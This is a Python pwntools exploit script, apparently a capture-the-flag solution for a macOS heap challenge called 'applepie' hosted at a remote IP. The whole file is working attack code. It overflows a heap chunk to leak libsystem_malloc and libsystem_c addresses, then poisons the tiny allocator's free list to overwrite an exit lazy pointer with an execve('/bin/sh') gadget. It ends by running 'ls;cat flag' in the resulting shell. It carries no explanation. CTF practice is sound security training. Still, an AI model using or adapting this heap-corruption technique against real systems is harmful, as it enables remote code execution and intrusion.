from pwn import *
import sys, time
import os

if len(sys.argv) == 1:
    p = process(["./applepie"])

else:
    p = remote("111.186.63.147", "6666")

def add(style, shape, size, name):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Choice: ", str(style))
    p.sendlineafter("Choice: ", str(shape))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Name: ", name)

def show(idx):
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Index: ", str(idx))

def update(idx, style, shape, size, name):
    p.sendlineafter("Choice: ", "3")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Choice: ", str(style))
    p.sendlineafter("Choice: ", str(shape))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Name: ", name)

def delete(idx):
    p.sendlineafter("Choice: ", "4")
    p.sendlineafter("Index: ", str(idx))

#context.log_level = "debug"
add(1, 1, 0x40, "\x00" * 0x40)     # 0
add(1, 1, 0x40, "\x01" * 0x40)     # 1
add(1, 1, 0x40, "\x02" * 0x40)     # 2

update(1, 2, 2, 0x40 + 0x18, "\x01" * 0x40 + p64(0x7f8) + p64(1) + p64(13371338))
show(2)

p.recvuntil("Style: ")
leak = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))

# [ 29] 45FAA4C0-D553-34FD-ADF8-884886AE0D2A 0x00007fff7102e000 /usr/lib/system/libsystem_kernel.dylib
# [ 17] 3DEEE96E-6DF6-35AD-8654-D69AC26B907B 0x00007fff70f42000 /usr/lib/system/libsystem_c.dylib
if (leak >> 40) != 0x7f:
    print("[-] Fail to leak")
    sys.exit(-1)

libsystem_malloc_base = leak - 81256
#libsystem_c_base = libsystem_malloc_base - 0x160000
libsystem_c_base = libsystem_malloc_base - 0x161000

'''
    0x7fff70f67d94: 48 8d 3d bb f4 05 00  lea    rdi, [rip + 0x5f4bb]      ; "/bin/sh"
    0x7fff70f67d9b: 4c 89 f6              mov    rsi, r14
    0x7fff70f67d9e: 48 8b 95 b0 fb ff ff  mov    rdx, qword ptr [rbp - 0x450]
    0x7fff70f67da5: e8 a8 b6 05 00        call   0x7fff70fc3452            ; symbol stub for: execve
'''

oneshot = libsystem_c_base + 0x25d94
print("[-] First leak : " + hex(leak))
print("[-] libsystem_malloc.dylib base : " + hex(libsystem_malloc_base))
print("[-] libsystem_c.dylib base : " + hex(libsystem_c_base))
print("[-] libsystem_c.dylib oneshot : " + hex(oneshot))

# We need to leak library data space to overwrite got area
#update(1, 2, 2, 0x40 + 0x18, "\x01" * 0x40 + p64(0xffffffffffffffef) + p64(1) + p64(13371338))
update(1, 2, 2, 0x40 + 0x18, "\x01" * 0x40 + p64(0x1fffffffffffffef) + p64(1) + p64(13371338))
show(2)
p.recvuntil("Style: ")
leak2 = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
_DATA = leak2 - 0x4110
exit_lazy = _DATA + 0xb0

# i don't know where this address point
print("[-] libsystem_c.dylib exit@lazy : " + hex(exit_lazy))
print("[-] second leak : " + hex(leak2))
print("[-] Unknown _DATA : " + hex(_DATA))

add(1, 1, 0x40, "\x03" * 0x40)     # 3
add(1, 1, 0x40, "\x04" * 0x40)     # 4      modify this :)
add(1, 1, 0x40, "\x05" * 0x40)     # 5
add(1, 1, 0x40, "\x06" * 0x40)     # 6
add(1, 1, 0x40, "\x07" * 0x40)     # 7
add(1, 1, 0x40, "\x08" * 0x40)     # 8

delete(3)
delete(5)
delete(7)

add(1, 1, 0x40, "\xda" * 0x40)     # 3
# address >> 4 for calculate logic in "tiny_malloc_from_free_list"
update(4, 1, 1, 0x58, "\x04" * 0x40 + p64(oneshot) + p64((exit_lazy) >> 4) + p64(133713381339))
p.sendlineafter("Choice: ", "1")
p.sendlineafter("Choice: ", "1")
print("[-] Alive")
p.sendlineafter("Choice: ", "1")
p.sendlineafter("Size: ", "2000")
p.sendline("ls;cat flag")

p.interactive()
# flag{Are_you_hungry?Ahaaaaaaaa!}
